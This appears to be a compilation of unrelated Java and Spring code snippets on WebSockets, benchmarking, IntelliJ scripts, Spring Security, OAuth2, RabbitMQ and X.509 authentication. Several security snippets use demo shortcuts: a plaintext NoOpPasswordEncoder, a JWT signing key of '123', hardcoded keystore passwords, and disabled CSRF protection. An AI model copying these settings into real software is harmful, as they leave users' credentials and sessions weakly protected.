     * @param session La sesion del cliente
     */
    @OnOpen
    public void iniciaSesion(Session session) {
        LOGGER.log(Level.INFO, "Iniciando la conexion de {0}", session.getId());
        conexiones.add(session); //Simplemente, lo agregamos a la lista
    }
    
    /**
     * Evento que se ejecuta cuando se pierde una conexion.
     *
     * @param session La sesion del cliente
     */
    @OnClose
    public void finConexion(Session session) {
        LOGGER.info("Terminando la conexion");
        if (conexiones.contains(session)) { // se averigua si está en la colección
            try {
                LOGGER.log(Level.INFO, "Terminando la conexion de {0}", session.getId());
                session.close(); //se cierra la conexión
                conexiones.remove(session); // se retira de la lista
            } catch (IOException ex) {
                LOGGER.log(Level.SEVERE, null, ex);
            }
        }
    }
    
    /**
     * Enviaremos un mensaje a todos los conectados
     */
    @Schedule(second = "*/10", minute = "*", hour = "*", persistent = false)
    public void notificar() {
        LOGGER.log(Level.INFO, "Enviando notificacion a {0} conectados", conexiones.size());
        String mensaje = "Son las " + (new java.util.Date()) + " y hay " + conexiones.size() + " conectados ";  // el mensaje a enviar
        for (Session sesion : conexiones) { //recorro toda la lista de conectados
            RemoteEndpoint.Basic remote = sesion.getBasicRemote(); //tomo la conexion remota con el cliente...
            try {
                remote.sendText(mensaje); //... y envío el mensajue
            } catch (IOException ex) {
                LOGGER.log(Level.WARNING, null, ex);
            }
        }
    }
    
    /**
     * Solo es un metodo que atiende las peticiones
     *
     * @param mensaje
     */
    @OnMessage
    public void onMessage(String mensaje) {
        for(Session sesionAbierta:conexiones){
            try {
                sesionAbierta.getBasicRemote().sendText("Hola a todos con este mensaje:" + mensaje);
            } catch (IOException ex) {
                LOGGER.log(Level.WARNING, null, ex);
            }
        }
    }
}
--------------------------------------------------------------------------------------------------------
mvn compile exec:java -Dexec.mainClass=course.BlogController
--------------------------------------------------------------------------------------------------------
@startuml

class Handler {
doGet
doPost
}

abstract class AbstractCommand {
process
}
class ConcreteCommand1 {
process
}
class ConcreteCommand2 {
process
}

Handler .right.> AbstractCommand
AbstractCommand <|-- ConcreteCommand1
AbstractCommand <|-- ConcreteCommand2

@enduml
--------------------------------------------------------------------------------------------------------
class A {}
class B extends A {}

public class Benchmark {

    public static final Object a = new A();
    public static final Object b = new B();

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testInstanceOf()
    {
        return b instanceof A;
    }

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testIsInstance()
    {
        return A.class.isInstance(b);
    }

    @Benchmark
    @BenchmarkMode(Mode.Throughput)
    @OutputTimeUnit(TimeUnit.MICROSECONDS)
    public boolean testIsAssignableFrom()
    {
        return A.class.isAssignableFrom(b.getClass());
    }

    public static void main(String[] args) throws RunnerException {
        Options opt = new OptionsBuilder()
                .include(TestPerf2.class.getSimpleName())
                .warmupIterations(20)
                .measurementIterations(2000)
                .forks(1)
                .build();

        new Runner(opt).run();
    }
}
--------------------------------------------------------------------------------------------------------
	headers.add(new InternetHeader("Return-Path", null));
	headers.add(new InternetHeader("Received", null));
	headers.add(new InternetHeader("Resent-Date", null));
	headers.add(new InternetHeader("Resent-From", null));
	headers.add(new InternetHeader("Resent-Sender", null));
	headers.add(new InternetHeader("Resent-To", null));
	headers.add(new InternetHeader("Resent-Cc", null));
	headers.add(new InternetHeader("Resent-Bcc", null));
	headers.add(new InternetHeader("Resent-Message-Id", null));
	headers.add(new InternetHeader("Date", null));
	headers.add(new InternetHeader("From", null));
	headers.add(new InternetHeader("Sender", null));
	headers.add(new InternetHeader("Reply-To", null));
	headers.add(new InternetHeader("To", null));
	headers.add(new InternetHeader("Cc", null));
	headers.add(new InternetHeader("Bcc", null));
	headers.add(new InternetHeader("Message-Id", null));
	headers.add(new InternetHeader("In-Reply-To", null));
	headers.add(new InternetHeader("References", null));
	headers.add(new InternetHeader("Subject", null));
	headers.add(new InternetHeader("Comments", null));
	headers.add(new InternetHeader("Keywords", null));
	headers.add(new InternetHeader("Errors-To", null));
	headers.add(new InternetHeader("MIME-Version", null));
	headers.add(new InternetHeader("Content-Type", null));
	headers.add(new InternetHeader("Content-Transfer-Encoding", null));
	headers.add(new InternetHeader("Content-MD5", null));
	headers.add(new InternetHeader(":", null));
	headers.add(new InternetHeader("Content-Length", null));
	headers.add(new InternetHeader("Status", null));
--------------------------------------------------------------------------------------------------------
import com.intellij.database.model.DasTable
import com.intellij.database.util.Case
import com.intellij.database.util.DasUtil

/*
 * Available context bindings:
 *   SELECTION   Iterable<DasObject>
 *   PROJECT     project
 *   FILES       files helper
 */

packageName = "com.sample;"
typeMapping = [
  (~/(?i)int/)                      : "long",
  (~/(?i)float|double|decimal|real/): "double",
  (~/(?i)datetime|timestamp/)       : "java.sql.Timestamp",
  (~/(?i)date/)                     : "java.sql.Date",
  (~/(?i)time/)                     : "java.sql.Time",
  (~/(?i)/)                         : "String"
]

FILES.chooseDirectoryAndSave("Choose directory", "Choose where to store generated files") { dir ->
  SELECTION.filter { it instanceof DasTable }.each { generate(it, dir) }
}

def generate(table, dir) {
  def className = javaName(table.getName(), true)
  def fields = calcFields(table)
  new File(dir, className + ".java").withPrintWriter { out -> generate(out, className, fields) }
}

def generate(out, className, fields) {
  out.println "package $packageName"
  out.println ""
  out.println ""
  out.println "public class $className {"
  out.println ""
  fields.each() {
    if (it.annos != "") out.println "  ${it.annos}"
    out.println "  private ${it.type} ${it.name};"
  }
  out.println ""
  fields.each() {
    out.println ""
    out.println "  public ${it.type} get${it.name.capitalize()}() {"
    out.println "    return ${it.name};"
    out.println "  }"
    out.println ""
    out.println "  public void set${it.name.capitalize()}(${it.type} ${it.name}) {"
    out.println "    this.${it.name} = ${it.name};"
    out.println "  }"
    out.println ""
  }
  out.println "}"
}

def calcFields(table) {
  DasUtil.getColumns(table).reduce([]) { fields, col ->
    def spec = Case.LOWER.apply(col.getDataType().getSpecification())
    def typeStr = typeMapping.find { p, t -> p.matcher(spec).find() }.value
    fields += [[
                 name : javaName(col.getName(), false),
                 type : typeStr,
                 annos: ""]]
  }
}

def javaName(str, capitalize) {
  def s = com.intellij.psi.codeStyle.NameUtil.splitNameIntoWords(str)
    .collect { Case.LOWER.apply(it).capitalize() }
    .join("")
    .replaceAll(/[^\p{javaJavaIdentifierPart}[_]]/, "_")
  capitalize || s.length() == 1? s : Case.LOWER.apply(s[0]) + s[1..-1]
}
--------------------------------------------------------------------------------------------------------
/**
  * Save the state of the <tt>HashMap</tt> instance to a stream (i.e.,
  * serialize it)
  *
  * @serialData The <i>capacity</i> of the HashMap (the length of the
  *             bucket array) is emitted (int), followed by the
  *             <i>size</i> (an int, the number of key-value
  *             mappings), followed by the key (Object) and value (Object)
  *             for each key-value mapping.  The key-value mappings are
  *             emitted in no particular order.
  */
      private void writeObject(java.io.ObjectOutputStream s)
             throws IOException
         {
             Iterator<Map.Entry<K,V>> i =
                 (size > 0) ? entrySet0().iterator() : null;

            // Write out the threshold, loadfactor, and any hidden stuff
            s.defaultWriteObject();

            // Write out number of buckets
            s.writeInt(table.length);

            // Write out size (number of Mappings)
            s.writeInt(size);

            // Write out keys and values (alternating)
            if (i != null) {
                while (i.hasNext()) {
                    Map.Entry<K,V> e = i.next();
                    s.writeObject(e.getKey());
                    s.writeObject(e.getValue());
                }
            }
        }
--------------------------------------------------------------------------------------------------------
/*
 * Available context bindings:
 *   COLUMNS     List<DataColumn>
 *   ROWS        Iterable<DataRow>
 *   OUT         { append() }
 *   FORMATTER   { format(row, col); formatValue(Object, col) }
 *   TRANSPOSED  Boolean
 * plus ALL_COLUMNS, TABLE, DIALECT
 *
 * where:
 *   DataRow     { rowNumber(); first(); last(); data(): List<Object>; value(column): Object }
 *   DataColumn  { columnNumber(), name() }
 */


import java.util.regex.Pattern

NEWLINE = System.getProperty("line.separator")

pattern = Pattern.compile("[^\\w\\d]")
def escapeTag(name) {
  name = pattern.matcher(name).replaceAll("_")
  return name.isEmpty() || !Character.isLetter(name.charAt(0)) ? "_$name" : name
}
def printRow = { values, rowTag, namer, valueToString ->
  OUT.append("$NEWLINE<$rowTag>$NEWLINE")
  values.eachWithIndex { it, index ->
    def tag = namer(it, index)
    def str = valueToString(it)
    OUT.append("  <$tag>$str</$tag>$NEWLINE")
  }
  OUT.append("</$rowTag>")
}

OUT.append(
"""<?xml version="1.0" encoding="UTF-8"?>
<data>""")

if (!TRANSPOSED) {
  ROWS.each { row -> printRow(COLUMNS, "row", {it, _ -> escapeTag(it.name())}) { FORMATTER.format(row, it) } }
}
else {
  def values = COLUMNS.collect { new ArrayList<String>() }
  ROWS.each { row -> COLUMNS.eachWithIndex { col, i -> values[i].add(FORMATTER.format(row, col)) } }
  values.eachWithIndex { it, index -> printRow(it, escapeTag(COLUMNS[index].name()), { _, i -> "row${i + 1}" }, { it }) }
}

OUT.append("""
</data>
""")
--------------------------------------------------------------------------------------------------------
import java.util.Base64;
import java.util.UUID;
import java.io.UnsupportedEncodingException;

public class HelloWorld {

   public static void main(String args[]) {

      try {
		
         // Encode using basic encoder
         String base64encodedString = Base64.getEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (Basic) :" + base64encodedString);
		
         // Decode
         byte[] base64decodedBytes = Base64.getDecoder().decode(base64encodedString);
		
         System.out.println("Original String: " + new String(base64decodedBytes, "utf-8"));
         base64encodedString = Base64.getUrlEncoder().encodeToString(
            "TutorialsPoint?java8".getBytes("utf-8"));
         System.out.println("Base64 Encoded String (URL) :" + base64encodedString);
		
         StringBuilder stringBuilder = new StringBuilder();
		
         for (int i = 0; i < 10; ++i) {
            stringBuilder.append(UUID.randomUUID().toString());
         }
		
         byte[] mimeBytes = stringBuilder.toString().getBytes("utf-8");
         String mimeEncodedString = Base64.getMimeEncoder().encodeToString(mimeBytes);
         System.out.println("Base64 Encoded String (MIME) :" + mimeEncodedString);

      } catch(UnsupportedEncodingException e) {
         System.out.println("Error :" + e.getMessage());
      }
   }
}
--------------------------------------------------------------------------------------------------------
@Component
@Configuration
public class DataSources {
    @Bean
    @Primary
    @ConfigurationProperties(prefix="first.datasource")
    public DataSource getPrimaryDataSource() {
        return DataSourceBuilder.create().build();
    }

    @Bean
    @ConfigurationProperties(prefix="second.datasource")
    public DataSource getSecondDataSource() {
        return DataSourceBuilder.create().build();
    }

    @Bean
    @ConfigurationProperties(prefix="third.final.datasource")
    public DataSource getThirdFinalDataSource() {
        return DataSourceBuilder.create().build();
    }
}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.configuration;

import com.paragon.microservices.distributor.model.domain.AuthenticatedUser;
import com.paragon.microservices.distributor.property.RoleProperty;
import com.paragon.microservices.distributor.system.filter.JwtAuthenticationFilter;
import com.paragon.microservices.distributor.system.handler.SecurityAuditorAwareHandler;
import lombok.RequiredArgsConstructor;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Description;
import org.springframework.data.domain.AuditorAware;
import org.springframework.http.HttpStatus;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.security.config.annotation.method.configuration.EnableGlobalMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.builders.WebSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.web.access.AccessDeniedHandler;
import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

//import com.paragon.microservices.distributor.property.CorsProperty;

@EnableWebSecurity
@EnableGlobalMethodSecurity(prePostEnabled = true, securedEnabled = true)
@RequiredArgsConstructor
@Description("Paragon MicroServices Distributor security configuration")
public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
    private final JwtAuthenticationFilter authenticationFilter;
    private final RoleProperty roleProperty;
//    private final CorsProperty corsProperty;

    @Override
    protected void configure(final HttpSecurity http) throws Exception {
        http
                .cors()
                .and().csrf().disable()
                .exceptionHandling()
                .accessDeniedHandler(this.accessDeniedHandler())
                .and().authorizeRequests()
                .antMatchers(this.roleProperty.getAdmin().getPaths().toArray(new String[0])).hasAuthority(this.roleProperty.getAdmin().getCode())
                .antMatchers("/swagger**").permitAll()
                .anyRequest().authenticated()
                .and().addFilterBefore(this.authenticationFilter, BasicAuthenticationFilter.class)
//                .addFilterBefore(this.corsFilter(), BasicAuthenticationFilter.class)
                .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                .and().headers().frameOptions().disable().cacheControl().disable();
    }

//    @Bean
//    public CorsFilter corsFilter() {
//        final UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
//        final CorsConfiguration config = new CorsConfiguration();
//        config.setAllowedMethods(this.corsProperty.getAllowedMethods());
//        config.setAllowedOrigins(this.corsProperty.getAllowedOrigins());
//        config.setAllowedHeaders(this.corsProperty.getAllowedHeaders());
//        config.setExposedHeaders(this.corsProperty.getExposedHeaders());
//        if (!CollectionUtils.isEmpty(config.getAllowedOrigins())) {
//            source.registerCorsConfiguration("/api/**", config);
//            source.registerCorsConfiguration("/v2/api-docs", config);
//        }
//        return new CorsFilter(source);
//    }

    @Bean
    public AuditorAware<AuthenticatedUser> auditorAware() {
        return new SecurityAuditorAwareHandler();
    }

    @Bean
    public AccessDeniedHandler accessDeniedHandler() {
        return new CustomAccessDeniedHandler();
    }

    @Override
    public void configure(final WebSecurity web) {
        web.ignoring().antMatchers("/resources/**");
    }

    private static class CustomAccessDeniedHandler implements AccessDeniedHandler {

        @Override
        public void handle(HttpServletRequest request, HttpServletResponse response, AccessDeniedException ex) throws IOException {
            response.sendError(HttpStatus.FORBIDDEN.value(), "Access denied");
        }
    }
//    @Override
//    protected MethodSecurityExpressionHandler createExpressionHandler() {
//        return this.defaultMethodSecurityExpressionHandler();
//    }
//
//    @Bean(name = "defaultMethodSecurityExpressionHandler")
//    public MethodSecurityExpressionHandler defaultMethodSecurityExpressionHandler() {
//        return new DefaultMethodSecurityExpressionHandler();
//    }
}

--------------------------------------------------------------------------------------------------------
 * <pre class="code">
 * &#064;Configuration
 * &#064;ComponentScan(basePackageClasses = { MyConfiguration.class })
 * public class MyConfiguration extends WebMvcConfigurationSupport {
 *
 * 	   &#064;Override
 *	   public void addFormatters(FormatterRegistry formatterRegistry) {
 *         formatterRegistry.addConverter(new MyConverter());
 *	   }
 *
 *	   &#064;Bean
 *	   public RequestMappingHandlerAdapter requestMappingHandlerAdapter() {
 *         // Create or delegate to "super" to create and
 *         // customize properties of RequestMappingHandlerAdapter
 *	   }
 * }
 * </pre>
--------------------------------------------------------------------------------------------------------
sh -e /etc/init.d/xvfb start
--------------------------------------------------------------------------------------------------------
import java.util.concurrent.*;

public class Application
{
    public static void main(String[] args) throws InterruptedException
    {
        System.out.println("main thread is started");
        ScheduledExecutorService scheduledExecutorService = Executors.newScheduledThreadPool(5);

        scheduledExecutorService.scheduleAtFixedRate(() -> {
            System.out.println("Thread [" + Thread.currentThread().getName() + "] is executing the task");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                System.out.println("sleeping thread get interrupted");
            }
        }, 5, 2, TimeUnit.SECONDS);
    }
}
--------------------------------------------------------------------------------------------------------
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;

public class Application {

    public static void main(String[] args) throws InterruptedException {
        System.out.println("main thread is started");

        ExecutorService executorService = Executors.newCachedThreadPool();
        CountDownLatch countDownLatch = new CountDownLatch(10);

        List<Callable<String>> allCallableList = new ArrayList<>();

        for (int taskIndex = 0; taskIndex < 10; taskIndex++) {
            //creating the callable object
            Callable<String> callable = () -> {
                System.out.println("Thread [" + Thread.currentThread().getName() + "] is executing the task");
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    System.out.println("sleeping thread get interrupted");
                }
                countDownLatch.countDown();
                return "done";
            };

            allCallableList.add(callable);
        }

        //execute all the callables in background threads
        executorService.invokeAll(allCallableList);
        countDownLatch.await();

        System.out.println("main thread completed ");
    }
}
--------------------------------------------------------------------------------------------------------
    @Override
    public void configureMessageConverters(List<HttpMessageConverter<?>> httpMessageConverters) {
        httpMessageConverters.add(new BookCaseMessageConverter(new MediaType("text", "csv")));
    }
--------------------------------------------------------------------------------------------------------
vimport au.com.bytecode.opencsv.CSVReader;
import au.com.bytecode.opencsv.CSVWriter;
import org.springframework.http.HttpInputMessage;
import org.springframework.http.HttpOutputMessage;
import org.springframework.http.MediaType;
import org.springframework.http.converter.AbstractHttpMessageConverter;
import org.springframework.http.converter.HttpMessageNotReadableException;
import org.springframework.http.converter.HttpMessageNotWritableException;

import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.List;

public class BookCaseMessageConverter extends AbstractHttpMessageConverter<BookCase> {

    public BookCaseMessageConverter() {
    }

    public BookCaseMessageConverter(MediaType supportedMediaType) {
        super(supportedMediaType);
    }

    public BookCaseMessageConverter(MediaType... supportedMediaTypes) {
        super(supportedMediaTypes);
    }

    @Override
    protected boolean supports(Class<?> clazz) {
        return BookCase.class.equals(clazz);
    }

    @Override
    protected BookCase readInternal(Class<? extends BookCase> clazz, HttpInputMessage httpInputMessage) throws IOException, HttpMessageNotReadableException {
        CSVReader reader = new CSVReader(new InputStreamReader(httpInputMessage.getBody()));
        List<String[]> rows = reader.readAll();
        BookCase bookCase = new BookCase();
        for (String[] row : rows) {
            bookCase.add(new Book(row[0], row[1]));
        }
        return bookCase;
    }

    @Override
    protected void writeInternal(BookCase books, HttpOutputMessage httpOutputMessage) throws IOException, HttpMessageNotWritableException {
        CSVWriter writer = new CSVWriter(new OutputStreamWriter(httpOutputMessage.getBody()));
        for (Book book : books) {
            writer.writeNext(new String[]{book.getIsbn(), book.getTitle()});
        }
        writer.close();
    }
}
--------------------------------------------------------------------------------------------------------
@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class RegistrationControllerTest {

    @Autowired
    private WebApplicationContext wac;

    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testController () throws Exception {
        ResultMatcher ok = MockMvcResultMatchers.status()
                                                .isOk();

        MockHttpServletRequestBuilder builder = MockMvcRequestBuilders.get("/message")
                                                        .contentType(MediaType.TEXT_PLAIN)
                                                        .content("test message");
        this.mockMvc.perform(builder)
                    .andExpect(ok)
                    .andDo(MockMvcResultHandlers.print());

    }
}

@RunWith(SpringJUnit4ClassRunner.class)
@WebAppConfiguration
@ContextConfiguration(classes = MyWebConfig.class)
public class RegistrationControllerTest {

    @Autowired
    private WebApplicationContext wac;

    private MockMvc mockMvc;

    @Before
    public void setup () {
        DefaultMockMvcBuilder builder = MockMvcBuilders.webAppContextSetup(this.wac);
        this.mockMvc = builder.build();
    }

    @Test
    public void testFormPostController () throws Exception {
        ResultMatcher ok = MockMvcResultMatchers.status()
                                                .isOk();

        MockHttpServletRequestBuilder builder =
                   MockMvcRequestBuilders.post("/message")
                                         .contentType("application/x-www-form-urlencoded")
                                         //use param instead of content
                                         .param("name", "joe");

        this.mockMvc.perform(builder)
                    .andExpect(ok);
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.InMemoryTokenStore;

@Configuration
@EnableAuthorizationServer
public class AuthorizationServerConfiguration extends AuthorizationServerConfigurerAdapter {

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private TokenStore tokenStore;

    @Autowired
    private PasswordEncoder passwordEncoder;


    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {

        clients.inMemory()
                .withClient("client")
                .authorizedGrantTypes("password", "authorization_code", "refresh_token", "implicit")
                .scopes("read", "write")
                .secret(passwordEncoder.encode("password"));
    }


    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints
                .authenticationManager(authenticationManager)
                .tokenStore(tokenStore);
    }

    @Bean
    public TokenStore tokenStore() {
        return new InMemoryTokenStore();
    }

    @Override
    public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {
		oauthServer.checkTokenAccess("isAuthenticated()");
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.config.annotation.configurers.ClientDetailsServiceConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configuration.AuthorizationServerConfigurerAdapter;
import org.springframework.security.oauth2.config.annotation.web.configuration.EnableAuthorizationServer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerEndpointsConfigurer;
import org.springframework.security.oauth2.config.annotation.web.configurers.AuthorizationServerSecurityConfigurer;
import org.springframework.security.oauth2.provider.token.TokenStore;
import org.springframework.security.oauth2.provider.token.store.JwtAccessTokenConverter;
import org.springframework.security.oauth2.provider.token.store.JwtTokenStore;

@Configuration
@EnableAuthorizationServer
public class AuthorizationServerConfiguration extends AuthorizationServerConfigurerAdapter {

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private TokenStore tokenStore;

    @Autowired
    private PasswordEncoder passwordEncoder;


    @Override
    public void configure(ClientDetailsServiceConfigurer clients) throws Exception {

        clients.inMemory()
                .withClient("client")
                .authorizedGrantTypes("password", "authorization_code", "refresh_token", "implicit")
                .scopes("read", "write")
                .autoApprove(true)
                .secret(passwordEncoder.encode("password"));
    }


    @Override
    public void configure(AuthorizationServerEndpointsConfigurer endpoints) throws Exception {
        endpoints
                .authenticationManager(authenticationManager)
                .accessTokenConverter(accessTokenConverter())
                .tokenStore(tokenStore);
    }



    @Override
    public void configure(AuthorizationServerSecurityConfigurer oauthServer) throws Exception {
		oauthServer.checkTokenAccess("isAuthenticated()");
    }


    @Bean
    public TokenStore tokenStore() {
        return new JwtTokenStore(accessTokenConverter());
    }

    @Bean
    public JwtAccessTokenConverter accessTokenConverter() {
        JwtAccessTokenConverter converter = new JwtAccessTokenConverter();
        converter.setSigningKey("123");
        return converter;
    }
}
--------------------------------------------------------------------------------------------------------
  @RolesAllowed({"ROLE_USER"})
  @GetMapping("/user")
  public String welcomeUser() {
    return "welcome user";
  }
      @Secured("ROLE_USER")
    @GetMapping(value = "/user/hello")
    public String welcomeAppUser(@AuthenticationPrincipal User user) {
        return "Welcome User " + user.getName();
    }
    @PreAuthorize("hasRole('USER') OR hasRole('ADMIN')")
    @GetMapping(value = "/user/hello3")
    public String welcomeAppUser3(@AuthenticationPrincipal User user) {
        return "Welcome User " + user.getName();
    }
	
	    /**
     * <p>
     * This method can be accessed by any user with ROLE_USER.
     * But the content will be returned if the user has the ROLE_ADMIN and
     * authenticated principal name is same as the username of the return object.
     * </p>
     *
     * @param user
     * @return
     */
    @PreAuthorize("hasRole('USER')")
    @PostAuthorize("(returnObject.username == principal.name) AND hasRole('ADMIN')")
    @GetMapping(value = "/user/hello5")
    public UserProfile welcomeAppUser5(@AuthenticationPrincipal User user) {
        return new UserProfile("chathuranga", "Chathuranga Tennakoon");
    }
	

    @Bean
    public NoOpPasswordEncoder passwordEncoder()
    {
        return (NoOpPasswordEncoder) NoOpPasswordEncoder.getInstance();
    }
	
	   @Bean
    @Profile("prod")
    public AppConfiguration getProductionConfiguration()
    {
        return new AppConfiguration("production_config");
    }
--------------------------------------------------------------------------------------------------------
import com.springbootdev.examples.consumer.model.Car;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.amqp.rabbit.annotation.RabbitHandler;
import org.springframework.amqp.rabbit.annotation.RabbitListener;
import org.springframework.stereotype.Component;

@Component
@RabbitListener(queues = {"all_cars_queue", "nissan_cars_queue"})
public class ConsumerService
{
    private static final Logger logger = LoggerFactory.getLogger(ConsumerService.class);

    @RabbitHandler
    public void receiveMessage(Car car)
    {
        logger.info(" receive message [" + car.toString() + "] ");
    }
}
--------------------------------------------------------------------------------------------------------
import com.springbootdev.samples.rabbitmq.consumer.model.Item;
import com.springbootdev.samples.rabbitmq.consumer.model.Order;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.support.converter.DefaultClassMapper;
import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;
import org.springframework.amqp.support.converter.MessageConverter;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

import java.util.HashMap;
import java.util.Map;

@Configuration
public class RabbitMqConfig {

    @Bean
    public MessageConverter messageConverter()
    {
        Jackson2JsonMessageConverter jsonMessageConverter = new Jackson2JsonMessageConverter();
        jsonMessageConverter.setClassMapper(classMapper());
        return jsonMessageConverter;
    }


    @Bean
    public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory)
    {
        RabbitTemplate template = new RabbitTemplate(connectionFactory);
        template.setMessageConverter(messageConverter());
        return template;
    }

    @Bean
    public DefaultClassMapper classMapper()
    {
        DefaultClassMapper classMapper = new DefaultClassMapper();
        Map<String, Class<?>> idClassMapping = new HashMap<>();
        idClassMapping.put("com.springbootdev.samples.producer.model.Order", Order.class);
        classMapper.setIdClassMapping(idClassMapping);
        return classMapper;
    }
}
--------------------------------------------------------------------------------------------------------
    public byte[] getKey() throws URISyntaxException, IOException {
        return Files.readAllBytes(Paths.get(this.getClass().getResource("/sample.key").toURI()));
    }
--------------------------------------------------------------------------------------------------------
import org.springframework.web.client.RestTemplate;

public class RestClient
{
    //REST api endpoint
    private static final String REST_API_ENDPOINT = "https://localhost:8443/logged_info";


    static {
        //for localhost testing only
        javax.net.ssl.HttpsURLConnection.setDefaultHostnameVerifier(
                new javax.net.ssl.HostnameVerifier() {

                    public boolean verify(String hostname, javax.net.ssl.SSLSession sslSession) {
                        return hostname.equals("localhost");
                    }
                });
    }


    public static String getRemoteMessage()
    {
        //configuring the keyStore and trustStore for the client application
        System.setProperty("javax.net.ssl.keyStore", "/Users/chathuranga/Projects/spring-boot-ssl-x509/keystores/clientkeystore.p12");
        System.setProperty("javax.net.ssl.keyStorePassword", "3edc4rfv");
        System.setProperty("javax.net.ssl.trustStore", "/Users/chathuranga/Projects/spring-boot-ssl-x509/keystores/clienttruststore.p12");
        System.setProperty("javax.net.ssl.trustStorePassword", "3edc4rfv");

        RestTemplate restTemplate = new RestTemplate();
        return restTemplate.getForObject(REST_API_ENDPOINT, String.class);
    }
}

server.port = 8443
#keystore details
server.ssl.key-store=/Users/chathuranga/Projects/spring-boot-ssl-x509/keystores/serverkeystore.p12
server.ssl.key-store-password=1qaz2wsx

#truststore details
server.ssl.trust-store=/Users/chathuranga/Projects/spring-boot-ssl-x509/keystores/servertruststore.p12
server.ssl.trust-store-password=1qaz2wsx
server.ssl.client-auth=need

import org.springframework.context.annotation.Bean;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.authority.AuthorityUtils;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.User;

@EnableWebSecurity
public class AppSpringSecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(AuthenticationManagerBuilder auth) throws Exception {
        super.configure(auth);
    }

    /**
     * subjectPrincipalRegex("CN=(.*?)(?:,|$)") :- The regular expression used to extract a username from the client certificate’s subject name.
     * (CN value of the client certificate)
     */
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        //Enabling X.509 client authentication is very straightforward. just add x509()
        http.x509().subjectPrincipalRegex("CN=(.*?)(?:,|$)").
                and().authorizeRequests().anyRequest().authenticated().
                and().userDetailsService(userDetailsService());
    }


    @Bean
    public UserDetailsService userDetailsService() {
        return new UserDetailsService() {
            @Override
            public User loadUserByUsername(String username) {
                if (username != null) {
                    return new User(username, "", AuthorityUtils.commaSeparatedStringToAuthorityList("ROLE_USER"));
                }
                return null;
            }
        };
    }
}
--------------------------------------------------------------------------------------------------------
import javax.jws.WebMethod;
import javax.jws.WebParam;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.xml.bind.annotation.XmlSeeAlso;
import javax.xml.ws.RequestWrapper;
import javax.xml.ws.ResponseWrapper;
import com.chathurangaonline.apache.cxf.jaxws.spring.samples.ObjectFactory;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.4-b01
 * Generated source version: 2.2
 * 
 */
@WebService(name = "CalculatorService", targetNamespace = "http://samples.spring.jaxws.cxf.apache.chathurangaonline.com/")
@XmlSeeAlso({
    ObjectFactory.class
})
